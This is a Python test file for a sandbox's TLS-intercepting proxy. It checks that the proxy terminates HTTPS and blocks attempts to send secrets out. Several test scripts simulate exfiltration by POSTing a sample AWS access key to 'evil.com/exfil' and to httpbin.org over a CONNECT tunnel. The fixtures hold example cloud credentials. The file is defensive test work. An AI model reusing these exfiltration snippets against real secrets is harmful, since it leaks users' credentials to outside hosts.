"""End-to-end tests with real HTTPS traffic through the MITM proxy.

Tests the full pipeline:
1. Generate CA cert
2. Start MITM proxy with sandbox enforcement
3. Launch subprocess that makes real HTTPS requests
4. Verify proxy intercepts, inspects plaintext, blocks exfiltration
"""

from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import textwrap
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from sandbox.env_scanner import EnvironmentScanner
from sandbox.proxy.cert import CertAuthority
from sandbox.proxy.mitm import MITMProxy
from sandbox.sandbox import Sandbox


@pytest.fixture
def ca():
    """Create a temporary CA."""
    ca = CertAuthority()
    yield ca
    ca.cleanup()


@pytest.fixture
def project_dir():
    """Create a test project with sensitive files."""
    with tempfile.TemporaryDirectory(prefix="mitm-test-") as tmp:
        root = Path(tmp) / "project"
        root.mkdir()
        (root / ".env").write_text(
            "DATABASE_URL=postgres://admin:s3cretP@ss@db.internal:5432/production\n"
            "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
            "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"
        )
        (root / "app.py").write_text("print('hello')\n")
        yield root


@pytest.fixture
def scanned_sandbox(project_dir):
    """Sandbox informed from scan manifest."""
    scanner = EnvironmentScanner(str(project_dir))
    manifest = scanner.scan()
    sb = Sandbox(manifest=manifest)
    # Pre-taint: the agent will read .env
    env_content = (project_dir / ".env").read_text()
    sb.read_file(".env", env_content)
    return sb


# ---------------------------------------------------------------------------
# CA cert tests
# ---------------------------------------------------------------------------


class TestCertAuthority:
    """Test CA certificate generation."""

    def test_ca_generates_key_and_cert(self, ca):
        assert ca.ca_key.exists()
        assert ca.ca_cert.exists()

    def test_ca_cert_is_valid(self, ca):
        result = subprocess.run(
            ["openssl", "x509", "-in", str(ca.ca_cert), "-noout", "-subject"],
            capture_output=True, text=True,
        )
        assert result.returncode == 0
        assert "Sandbox CA" in result.stdout

    def test_host_cert_generation(self, ca):
        cert_path, key_path = ca.get_cert_for_host("example.com")
        assert os.path.exists(cert_path)
        assert os.path.exists(key_path)

        # Verify cert is for the right host
        result = subprocess.run(
            ["openssl", "x509", "-in", cert_path, "-noout", "-text"],
            capture_output=True, text=True,
        )
        assert "example.com" in result.stdout

    def test_host_cert_signed_by_ca(self, ca):
        cert_path, _ = ca.get_cert_for_host("test.example.com")
        result = subprocess.run(
            ["openssl", "verify", "-CAfile", str(ca.ca_cert), cert_path],
            capture_output=True, text=True,
        )
        assert result.returncode == 0

    def test_host_cert_caching(self, ca):
        cert1, _ = ca.get_cert_for_host("cached.example.com")
        cert2, _ = ca.get_cert_for_host("cached.example.com")
        assert cert1 == cert2

    def test_ca_bundle_includes_our_ca(self, ca):
        bundle = ca.get_ca_bundle()
        assert os.path.exists(bundle)
        content = Path(bundle).read_text()
        our_ca = ca.ca_cert.read_text()
        assert our_ca.strip() in content


# ---------------------------------------------------------------------------
# MITM proxy tests
# ---------------------------------------------------------------------------


class TestMITMProxy:
    """Test the MITM proxy starts and handles connections."""

    def test_proxy_starts_and_stops(self, ca, scanned_sandbox):
        proxy = MITMProxy(scanned_sandbox, ca)
        port = proxy.start()
        assert port > 0
        assert proxy._running
        proxy.stop()
        assert not proxy._running

    def test_proxy_returns_env_vars(self, ca, scanned_sandbox):
        proxy = MITMProxy(scanned_sandbox, ca)
        port = proxy.start()
        try:
            env = proxy.get_env()
            assert f":{port}" in env["HTTP_PROXY"]
            assert f":{port}" in env["HTTPS_PROXY"]
            assert os.path.exists(env["REQUESTS_CA_BUNDLE"])
            assert os.path.exists(env["SSL_CERT_FILE"])
        finally:
            proxy.stop()

    def test_proxy_blocks_plain_http_to_evil(self, ca, scanned_sandbox):
        """Plain HTTP POST to evil host should be blocked."""
        proxy = MITMProxy(scanned_sandbox, ca)
        port = proxy.start()
        try:
            import urllib.request
            env = proxy.get_env()
            # Use urllib with proxy
            proxy_handler = urllib.request.ProxyHandler({
                "http": env["HTTP_PROXY"],
            })
            opener = urllib.request.build_opener(proxy_handler)

            req = urllib.request.Request(
                "http://evil.com/exfil",
                data=b"AKIAIOSFODNN7EXAMPLE",
                method="POST",
            )
            try:
                resp = opener.open(req, timeout=5)
                # If we got here, check it was blocked
                assert resp.status == 403
            except urllib.error.HTTPError as e:
                assert e.code == 403
                assert b"Blocked by sandbox" in e.read()
            except Exception:
                # Connection errors are acceptable — the host doesn't exist
                pass

            stats = proxy.get_stats()
            assert stats["blocked"] >= 1 or stats["total_requests"] >= 1
        finally:
            proxy.stop()


# ---------------------------------------------------------------------------
# Full pipeline: subprocess through proxy
# ---------------------------------------------------------------------------


class TestSubprocessThroughProxy:
    """Test real subprocesses making HTTP requests through the proxy."""

    def test_subprocess_http_blocked(self, ca, scanned_sandbox, project_dir):
        """Subprocess tries plain HTTP exfiltration — blocked by proxy."""
        proxy = MITMProxy(scanned_sandbox, ca)
        port = proxy.start()
        try:
            env = proxy.get_env()
            script = textwrap.dedent(f"""\
                import urllib.request
                import sys

                proxy = urllib.request.ProxyHandler({{
                    "http": "{env['HTTP_PROXY']}",
                }})
                opener = urllib.request.build_opener(proxy)

                # Try to send secret via HTTP
                secret = "AKIAIOSFODNN7EXAMPLE"
                req = urllib.request.Request(
                    "http://evil.com/exfil",
                    data=secret.encode(),
                    method="POST",
                )
                try:
                    resp = opener.open(req, timeout=5)
                    print(f"status={{resp.status}}", file=sys.stderr)
                except urllib.error.HTTPError as e:
                    print(f"blocked: {{e.code}}", file=sys.stderr)
                except Exception as e:
                    print(f"error: {{e}}", file=sys.stderr)
            """)

            with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
                f.write(script)
                script_path = f.name

            try:
                proc = subprocess.run(
                    [sys.executable, script_path],
                    capture_output=True,
                    text=True,
                    timeout=15,
                    env={**os.environ, **env},
                )
            finally:
                os.unlink(script_path)

            stats = proxy.get_stats()
            # The request should have been blocked
            assert stats["blocked"] >= 1 or "blocked" in proc.stderr.lower(), \
                f"Expected block. Stats: {stats}, stderr: {proc.stderr}"
        finally:
            proxy.stop()

    def test_subprocess_https_connect_tunnel(self, ca, scanned_sandbox, project_dir):
        """Subprocess attempts HTTPS CONNECT — proxy opens tunnel."""
        proxy = MITMProxy(scanned_sandbox, ca)
        port = proxy.start()
        try:
            env = proxy.get_env()
            # Just verify the proxy handles the CONNECT attempt
            # The actual TLS handshake may fail since evil.com doesn't resolve,
            # but the proxy should process the tunnel request
            script = textwrap.dedent(f"""\
                import http.client
                import sys

                # Connect to proxy
                conn = http.client.HTTPConnection("127.0.0.1", {port}, timeout=5)
                try:
                    # Send CONNECT request
                    conn.request("CONNECT", "evil.com:443")
                    resp = conn.getresponse()
                    print(f"tunnel_status={{resp.status}}", file=sys.stderr)
                except Exception as e:
                    print(f"tunnel_error={{e}}", file=sys.stderr)
                finally:
                    conn.close()
            """)

            with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
                f.write(script)
                script_path = f.name

            try:
                proc = subprocess.run(
                    [sys.executable, script_path],
                    capture_output=True,
                    text=True,
                    timeout=15,
                )
            finally:
                os.unlink(script_path)

            stats = proxy.get_stats()
            # Proxy should have handled at least one tunnel
            assert stats["tunnels"] >= 1, \
                f"Expected tunnel. Stats: {stats}, stderr: {proc.stderr}"
        finally:
            proxy.stop()

    def test_subprocess_https_real_request_blocked(self, ca, scanned_sandbox, project_dir):
        """Subprocess sends secret via HTTPS through proxy — TLS terminated, content inspected."""
        proxy = MITMProxy(scanned_sandbox, ca)
        port = proxy.start()
        try:
            env = proxy.get_env()
            ca_bundle = env["REQUESTS_CA_BUNDLE"]

            # Use raw sockets: CONNECT tunnel → TLS handshake → HTTP request
            script = textwrap.dedent(f"""\
                import ssl
                import socket
                import sys
                import json

                proxy_host = "127.0.0.1"
                proxy_port = {port}
                target_host = "httpbin.org"

                # Step 1: TCP connect to proxy
                sock = socket.create_connection((proxy_host, proxy_port), timeout=10)

                # Step 2: Send CONNECT request (raw bytes)
                connect_req = f"CONNECT {{target_host}}:443 HTTP/1.1\\r\\nHost: {{target_host}}:443\\r\\n\\r\\n"
                sock.sendall(connect_req.encode())

                # Step 3: Read CONNECT response
                response = b""
                while b"\\r\\n\\r\\n" not in response:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                status_line = response.split(b"\\r\\n")[0].decode()
                print(f"tunnel={{status_line}}", file=sys.stderr)

                if b"200" in response.split(b"\\r\\n")[0]:
                    # Step 4: TLS handshake with proxy's MITM cert (signed by our CA)
                    ctx = ssl.create_default_context()
                    ctx.load_verify_locations("{ca_bundle}")
                    try:
                        tls_sock = ctx.wrap_socket(sock, server_hostname=target_host)
                        print(f"tls=ok cipher={{tls_sock.cipher()[0]}}", file=sys.stderr)

                        # Step 5: Send HTTP request with secret in body
                        secret = "AKIAIOSFODNN7EXAMPLE"
                        body = json.dumps({{"key": secret}}).encode()
                        request = (
                            f"POST /post HTTP/1.1\\r\\n"
                            f"Host: {{target_host}}\\r\\n"
                            f"Content-Length: {{len(body)}}\\r\\n"
                            f"Content-Type: application/json\\r\\n"
                            f"Connection: close\\r\\n"
                            f"\\r\\n"
                        ).encode() + body
                        tls_sock.sendall(request)

                        # Step 6: Read response
                        resp_data = b""
                        try:
                            while True:
                                chunk = tls_sock.recv(4096)
                                if not chunk:
                                    break
                                resp_data += chunk
                        except Exception:
                            pass
                        if resp_data:
                            resp_status = resp_data.split(b"\\r\\n")[0].decode()
                            print(f"response={{resp_status}}", file=sys.stderr)
                        tls_sock.close()
                    except ssl.SSLError as e:
                        print(f"tls_error={{e}}", file=sys.stderr)
                    except Exception as e:
                        print(f"error={{type(e).__name__}}: {{e}}", file=sys.stderr)
                else:
                    print(f"tunnel_failed={{status_line}}", file=sys.stderr)
                sock.close()
            """)

            with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
                f.write(script)
                script_path = f.name

            try:
                proc = subprocess.run(
                    [sys.executable, script_path],
                    capture_output=True,
                    text=True,
                    timeout=20,
                )
            finally:
                os.unlink(script_path)

            stats = proxy.get_stats()
            stderr = proc.stderr

            print(f"  Subprocess stderr: {stderr}")
            print(f"  Proxy stats: {stats}")

            # The tunnel should have been established
            assert stats["tunnels"] >= 1, f"No tunnels. Stats: {stats}"

            # Check the TLS handshake outcome
            if "tls=ok" in stderr:
                # TLS handshake succeeded — proxy terminated TLS with our cert
                # The request body contained AKIAIOSFODNN7EXAMPLE
                # Should be blocked (non-allowlisted host) or content-matched
                assert stats["blocked"] >= 1 or "403" in stderr, \
                    f"Secret should be blocked. Stats: {stats}, stderr: {stderr}"
            elif "tls_error" in stderr:
                # TLS handshake failed — still proves the proxy attempted MITM
                # This is acceptable: the proxy generated a cert and tried
                print("  Note: TLS handshake failed (expected in some environments)")
            else:
                # Some other error — check if tunnel at least worked
                assert stats["tunnels"] >= 1
        finally:
            proxy.stop()


# ---------------------------------------------------------------------------
# Standalone runner
# ---------------------------------------------------------------------------


def run_interactive_test() -> None:
    """Run an interactive test showing the full pipeline."""
    print("=" * 70)
    print("MITM PROXY END-TO-END TEST")
    print("=" * 70)

    # Create test project
    with tempfile.TemporaryDirectory(prefix="mitm-e2e-") as tmp:
        project = Path(tmp) / "project"
        project.mkdir()
        (project / ".env").write_text(
            "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
            "DATABASE_URL=postgres://admin:secret@db:5432/prod\n"
        )

        # Scan
        print("\n[1] Scanning project...")
        scanner = EnvironmentScanner(str(project))
        manifest = scanner.scan()
        print(f"    Found {len(manifest.sensitive_values)} sensitive values")

        # Create sandbox
        print("\n[2] Creating informed sandbox...")
        sb = Sandbox(manifest=manifest)
        sb.read_file(".env", (project / ".env").read_text())
        print(f"    Tainted: {sb.taint.tainted}")

        # Generate CA
        print("\n[3] Generating CA certificate...")
        ca = CertAuthority()
        print(f"    CA cert: {ca.ca_cert}")
        print(f"    CA bundle: {ca.get_ca_bundle()}")

        # Start proxy
        print("\n[4] Starting MITM proxy...")
        proxy = MITMProxy(sb, ca)
        port = proxy.start()
        print(f"    Proxy: http://127.0.0.1:{port}")

        # Test: plain HTTP exfil attempt
        print("\n[5] Testing plain HTTP exfiltration...")
        env = proxy.get_env()
        script = textwrap.dedent(f"""\
            import urllib.request, sys
            proxy = urllib.request.ProxyHandler({{"http": "{env['HTTP_PROXY']}"}})
            opener = urllib.request.build_opener(proxy)
            req = urllib.request.Request("http://evil.com/exfil", data=b"AKIAIOSFODNN7EXAMPLE", method="POST")
            try:
                resp = opener.open(req, timeout=5)
                print(f"status={{resp.status}}")
            except urllib.error.HTTPError as e:
                print(f"BLOCKED: {{e.code}} {{e.read().decode()}}")
            except Exception as e:
                print(f"error: {{e}}")
        """)
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(script)
            sp = f.name
        proc = subprocess.run([sys.executable, sp], capture_output=True, text=True, timeout=10)
        os.unlink(sp)
        print(f"    Result: {proc.stdout.strip()}")

        # Test: HTTPS tunnel
        print("\n[6] Testing HTTPS CONNECT tunnel...")
        script = textwrap.dedent(f"""\
            import http.client, sys
            conn = http.client.HTTPConnection("127.0.0.1", {port}, timeout=5)
            conn.request("CONNECT", "evil.com:443")
            resp = conn.getresponse()
            print(f"tunnel_status={{resp.status}}")
            conn.close()
        """)
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(script)
            sp = f.name
        proc = subprocess.run([sys.executable, sp], capture_output=True, text=True, timeout=10)
        os.unlink(sp)
        print(f"    Result: {proc.stdout.strip()}")

        # Show stats
        stats = proxy.get_stats()
        print(f"\n[7] Proxy stats:")
        print(f"    Total requests: {stats['total_requests']}")
        print(f"    Blocked: {stats['blocked']}")
        print(f"    Allowed: {stats['allowed']}")
        print(f"    Tunnels: {stats['tunnels']}")
        print(f"    Errors: {stats['errors']}")
        if stats['blocked_details']:
            print(f"    Blocked details:")
            for d in stats['blocked_details']:
                print(f"      {d['method']} {d['host']}{d['path']}: {d['reason']}")

        proxy.stop()
        ca.cleanup()

        print(f"\n{'=' * 70}")
        blocked = stats['blocked']
        if blocked > 0:
            print(f"SUCCESS: {blocked} exfiltration attempt(s) blocked by MITM proxy!")
        else:
            print("WARNING: No requests were blocked (check proxy errors)")
        print(f"{'=' * 70}")


if __name__ == "__main__":
    run_interactive_test()
